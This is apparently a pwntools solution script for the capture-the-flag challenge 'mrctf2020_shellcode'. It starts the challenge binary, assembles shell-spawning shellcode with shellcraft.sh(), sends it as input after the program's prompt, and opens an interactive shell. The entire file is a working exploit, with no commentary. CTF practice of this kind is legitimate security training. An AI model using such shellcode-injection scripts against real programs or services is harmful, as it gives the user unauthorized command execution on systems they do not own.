from pwn import *
context(arch='amd64',log_level='debug')
#io = gdb.debug('./mrctf2020_shellcode','break main')
io = process('./mrctf2020_shellcode')
payload = asm(shellcraft.sh())
io.sendlineafter(b'Show me your magic!\n',payload)
io.interactive()
